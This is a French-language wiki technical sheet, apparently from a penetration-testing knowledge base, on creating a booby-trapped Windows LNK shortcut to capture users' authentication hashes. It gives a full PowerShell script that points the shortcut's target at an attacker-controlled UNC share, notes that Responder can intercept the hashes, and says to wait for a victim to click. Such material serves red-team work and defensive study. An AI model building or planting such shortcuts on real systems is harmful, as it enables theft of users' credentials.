---
title: Créer un fichier LNK piégé
description: Guide pour la création de fichier LNK piégé. Un fichier LNK peut être utilisé par un attaquant pour récupérer les hash des utilisateurs.
published: true
date: 2025-05-04T14:53:26.625Z
tags: windows, fiche technique
editor: markdown
dateCreated: 2024-10-26T09:51:45.018Z
---

# Introduction

Guide pour la création de fichier LNK piégé. Un fichier LNK peut être utilisé par un attaquant pour récupérer les hash des utilisateurs.

> Un fichier LNK est utilisé comme un raccourci vers des ressources diverses.
> {.is-info}

La base de l'exploitation repose sur le fait de définir la cible du fichier LNK vers le serveur d'un attaquant. En cliquant sur le raccourci, l'utilisateur va essayer de s'authentifier au serveur pour récupérer ce fichier.

> Les fichiers LNK piégés sont une alternative aux fichiers SCF piégés, qui ne fonctionnent plus sur les environnements Windows Server 2019.
> {.is-info}

# Création du fichier

```
# Créer un nouvel objet COM et le stocker dans la variable COMobjShell.
$COMobjShell = New-Object -ComObject WScript.Shell
# Appeller la méthode CreateShortcut de l'objet pour créer le raccourci.
$lnk = $COMobjShell.CreateShortcut("<emplacement fichier .lnk>")
# Définir la cible du raccourci.
$lnk.TargetPath = "\\<adresse de la machine attaquante>\<fichier>"
# Défini le style de fenêtre, ici : "La fenêtre est mise au premier plan et est restauré à sa taille et sa position d'origine."
$lnk.WindowStyle = 1
# Définir l'icône du raccourci.
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
# Définir une description du raccourci
$lnk.Description = "ceci est un fichier lnk"
# Définir la combinaison de touches pour ouvrir le raccourci.
$lnk.HotKey = "Ctrl+Alt+O"
# sauvegarder le raccourci.
$lnk.Save()
```

> Le fichier ainsi que le partage n'existent pas obligatoirement sur le serveur attaquant, il est possible d'avoir uniquement un outil comme Responder pour intercepter les hash.
> {.is-info}

A présent, le fichier est maintenant créer, il suffit d'attendre que le fichier soit cliqué pour recevoir les informations d'authentification sur notre machine attaquante.

# Voir aussi

Fiche technique pour la création d'un fichier SCF piégé
[voir la page](/Fiches-techniques/Windows/Creer-un-fichier-SCF-piégé)

Lnkbomb, créer des fichiers raccourcis .url malveillants
[voir la page](/Outils/Indépendant/Lnkbomb)
